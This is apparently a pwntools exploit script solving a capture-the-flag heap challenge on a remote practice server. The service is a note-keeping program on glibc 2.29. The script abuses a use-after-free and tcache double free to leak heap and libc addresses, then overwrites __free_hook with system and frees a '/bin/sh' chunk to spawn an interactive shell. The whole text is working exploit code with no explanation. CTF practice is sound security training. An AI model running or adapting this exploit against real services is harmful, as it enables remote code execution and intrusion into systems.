from pwn import *

###Util
def create(size,content,remark):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Content: ',content)
    r.sendafter('Remark: ',remark)

def delete(idx):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Index: ',str(idx))

def edit(idx,content,remark):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Index: ',str(idx))
    r.sendafter('Content: ',content)
    r.sendafter('Remark: ',remark)

def show(idx):
    r.sendlineafter('choice: ','4')
    r.sendlineafter('Index: ',str(idx))
    return r.recvuntil('\nRemark: ',drop=True)[9:]

###Addr
#  libc2.29
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
r = remote('nc.eonew.cn',10015)

create(0x88,'M30W','M30W')
delete(0)
edit(0,p64(0)+p64(0),'M30W')
delete(0)
heap_addr = u64(show(0).ljust(8,b'\x00'))-0x260
print(hex(heap_addr))
for i in range(6):
    edit(0,p64(0)+p64(0),'M30W')
    delete(0)
unsorted_bin_addr = u64(show(0).ljust(8,b'\x00'))
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

edit(0,p64(libc_base+free_hook_offset),'M30W')
create(0x88,b'/bin/sh\x00',p64(libc_base+system_offset))
delete(1)

r.interactive()
